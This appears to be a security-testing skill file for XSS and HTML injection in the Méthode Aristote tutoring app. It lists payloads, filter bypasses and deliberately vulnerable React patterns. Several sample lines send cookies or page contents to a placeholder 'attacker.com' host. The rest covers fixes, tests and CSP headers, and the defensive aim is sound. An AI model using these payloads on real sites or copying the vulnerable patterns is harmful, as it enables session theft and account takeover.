---
skill_name: xss-html-injection
description: Test for Cross-Site Scripting and HTML injection in user-generated content
category: cybersec
priority: high
tags: [security, xss, html-injection, react, sanitization]
---

# XSS & HTML Injection Testing - Méthode Aristote

**PRIORITY #4 Security Risk**

## Context

Méthode Aristote handles extensive user-generated content:
- **Chat Messages**: AI chat, tutor-student messaging
- **Tutor Notes**: Session notes, student feedback
- **Parent Feedback**: Comments, concerns
- **Activity Descriptions**: Custom exercises, instructions
- **Student Answers**: Free-text responses, essays

**Risk**: React escapes by default, BUT:
- `dangerouslySetInnerHTML` usage
- Markdown rendering (rich text)
- HTML in Prisma text fields → rendered directly
- Third-party components (rich text editors, etc.)

## Attack Vectors

### 1. Reflected XSS
```typescript
// URL parameter injection
https://app.aristote.com/session?note=<script>alert(document.cookie)</script>

// Search injection
/search?q=<img src=x onerror=alert(1)>
```

### 2. Stored XSS
```typescript
// Store malicious content in database
await trpc.session.addNote.mutate({
  sessionId: "session_123",
  content: "<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>",
});

// Victim loads session notes → script executes
```

### 3. DOM-Based XSS
```typescript
// Unsafe DOM manipulation
const userInput = new URLSearchParams(location.search).get("name");
document.getElementById("welcome").innerHTML = `Hello ${userInput}!`;
// Exploited: ?name=<img src=x onerror=alert(1)>
```

### 4. Markdown Injection
```markdown
<!-- If using markdown renderer -->
Click [here](javascript:alert(document.cookie))
![xss](x" onerror="alert(1))
<details open ontoggle=alert(1)>
```

### 5. HTML Attribute Injection
```typescript
// Unsafe attribute binding
<img src={userInput} />
// Exploited: userInput = 'x" onerror="alert(1)"'
```

## Testing Protocol

### Step 1: Identify User Input Sinks

Map all user inputs to output locations:

```bash
# Find potential XSS sinks
grep -r "dangerouslySetInnerHTML" src/
grep -r "innerHTML" src/
grep -r "outerHTML" src/
grep -r ".html\(" src/ # jQuery if used
grep -r "ReactMarkdown" src/
grep -r "sanitize" src/
```

**Critical Sinks:**
- Chat message display
- Tutor notes display
- Activity instructions
- Student answer feedback
- Search results
- Error messages with user input

### Step 2: XSS Payload Testing

#### Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

#### Event Handler Payloads
```html
<img src=x onerror=fetch('https://attacker.com/steal?c='+document.cookie)>
<img src=x onerror=this.src='https://attacker.com/log?'+document.cookie>
```

#### Encoded Payloads
```html
<!-- HTML entity encoding -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C%2Fscript%3E

<!-- Unicode encoding -->
\u003cscript\u003ealert(1)\u003c/script\u003e
```

#### Bypass Filters
```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Null bytes -->
<script\0>alert(1)</script>

<!-- Alternative tags -->
<object data="javascript:alert(1)">
<embed src="data:text/html,<script>alert(1)</script>">
```

### Step 3: Markdown-Specific Payloads

```markdown
[Click me](javascript:alert(1))
[Click me](data:text/html,<script>alert(1)</script>)
![alt](x" onerror="alert(1)")
![](x)xxx://](x)x:alert(1)<!--

<!-- If allowing HTML in markdown -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Step 4: Context-Specific Testing

#### Chat Messages
```typescript
await trpc.chat.sendMessage.mutate({
  content: "<img src=x onerror=alert('XSS_in_chat')>",
  sessionId: "session_123",
});
// Load chat → does script execute?
```

#### Tutor Notes
```typescript
await trpc.session.addNote.mutate({
  content: "<script>fetch('https://attacker.com/steal?note='+document.body.innerHTML)</script>",
  sessionId: "session_123",
});
// Other tutors viewing → compromised?
```

#### Activity Instructions
```typescript
await trpc.activity.create.mutate({
  instructions: "Solve this: <img src=x onerror=alert('XSS_in_activity')>",
  type: "EXERCICE",
});
// Students viewing activity → script executes?
```

## Vulnerable Code Patterns

### ❌ VULNERABLE: dangerouslySetInnerHTML
```typescript
const ChatMessage = ({ content }: { content: string }) => {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
};

// Exploited by: content = "<img src=x onerror=alert(1)>"
```

### ❌ VULNERABLE: Unsanitized Markdown
```typescript
import ReactMarkdown from "react-markdown";

const Note = ({ markdown }: { markdown: string }) => {
  return <ReactMarkdown>{markdown}</ReactMarkdown>;
};

// Exploited by: markdown = "[Click](javascript:alert(1))"
```

### ❌ VULNERABLE: Direct DOM Manipulation
```typescript
const SearchResults = ({ query }: { query: string }) => {
  useEffect(() => {
    document.getElementById("query-display").innerHTML = `Results for: ${query}`;
  }, [query]);

  return <div id="query-display" />;
};

// Exploited by: query = "<img src=x onerror=alert(1)>"
```

### ✅ SECURE: React Default Escaping
```typescript
const ChatMessage = ({ content }: { content: string }) => {
  return <div>{content}</div>; // React auto-escapes
};

// Safe: content = "<script>alert(1)</script>" → displayed as text
```

### ✅ SECURE: Sanitized Markdown
```typescript
import ReactMarkdown from "react-markdown";
import rehypeSanitize from "rehype-sanitize";

const Note = ({ markdown }: { markdown: string }) => {
  return (
    <ReactMarkdown rehypePlugins={[rehypeSanitize]}>
      {markdown}
    </ReactMarkdown>
  );
};

// Safe: malicious markdown is sanitized
```

### ✅ SECURE: DOMPurify for HTML
```typescript
import DOMPurify from "isomorphic-dompurify";

const RichContent = ({ html }: { html: string }) => {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ["b", "i", "em", "strong", "a"],
    ALLOWED_ATTR: ["href"],
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
};
```

## Automated Testing

### Playwright E2E Tests
```typescript
// tests/e2e/security/xss.spec.ts
import { test, expect } from "@playwright/test";

test("chat messages are XSS-safe", async ({ page }) => {
  const xssPayload = "<img src=x onerror=alert('XSS')>";

  // Send malicious message
  await page.goto("/chat/session_123");
  await page.fill('[data-testid="chat-input"]', xssPayload);
  await page.click('[data-testid="send-button"]');

  // Verify no alert dialog
  page.on("dialog", () => {
    throw new Error("XSS vulnerability detected: alert dialog triggered");
  });

  // Verify content is escaped
  const messageContent = await page.textContent('[data-testid="last-message"]');
  expect(messageContent).toContain("<img src=x"); // Should be visible as text
});
```

### Integration Tests
```typescript
// tests/integration/xss.test.ts
describe("XSS Prevention", () => {
  const xssPayloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
  ];

  for (const payload of xssPayloads) {
    it(`sanitizes payload: ${payload}`, async () => {
      const caller = await createTestCaller();

      // Store malicious content
      await caller.session.addNote({
        sessionId: "test_session",
        content: payload,
      });

      // Retrieve and verify sanitization
      const session = await caller.session.getById({ id: "test_session" });
      const note = session.notes[0];

      // Should NOT contain executable code
      expect(note.content).not.toContain("<script");
      expect(note.content).not.toContain("onerror=");
      expect(note.content).not.toContain("javascript:");
    });
  }
});
```

## Content Security Policy (CSP)

### Recommended CSP Headers
```typescript
// next.config.js
const securityHeaders = [
  {
    key: "Content-Security-Policy",
    value: [
      "default-src 'self'",
      "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://clerk.com", // Remove unsafe-* in production
      "style-src 'self' 'unsafe-inline'",
      "img-src 'self' data: https:",
      "font-src 'self' data:",
      "connect-src 'self' https://api.openai.com https://clerk.com",
      "frame-ancestors 'none'",
      "base-uri 'self'",
      "form-action 'self'",
    ].join("; "),
  },
  {
    key: "X-Content-Type-Options",
    value: "nosniff",
  },
  {
    key: "X-Frame-Options",
    value: "DENY",
  },
  {
    key: "X-XSS-Protection",
    value: "1; mode=block",
  },
];

module.exports = {
  async headers() {
    return [
      {
        source: "/:path*",
        headers: securityHeaders,
      },
    ];
  },
};
```

## Remediation Checklist

- [ ] Remove all `dangerouslySetInnerHTML` usage (or sanitize)
- [ ] Add `rehype-sanitize` to ReactMarkdown
- [ ] Install `isomorphic-dompurify` for HTML sanitization
- [ ] Implement CSP headers
- [ ] Add XSS tests for all user input fields
- [ ] Review third-party components (rich text editors, etc.)
- [ ] Add automated XSS scanning to CI/CD
- [ ] Train team on XSS prevention

## Files to Review

**Critical:**
- `src/components/chat/*.tsx` - Chat message display
- `src/components/session/notes/*.tsx` - Tutor notes
- `src/components/activity/instructions/*.tsx` - Activity content
- `src/components/ui/markdown.tsx` - Markdown renderer (if exists)

**Create:**
- `tests/e2e/security/xss.spec.ts` - E2E XSS tests
- `tests/integration/xss.test.ts` - Integration XSS tests
- `src/lib/sanitize.ts` - Centralized sanitization helpers

## Success Criteria

- [ ] Zero `dangerouslySetInnerHTML` without sanitization
- [ ] All markdown rendering uses `rehype-sanitize`
- [ ] CSP headers implemented and tested
- [ ] XSS tests cover all user input → output paths
- [ ] No XSS vulnerabilities found in automated scans
- [ ] Security documentation for content handling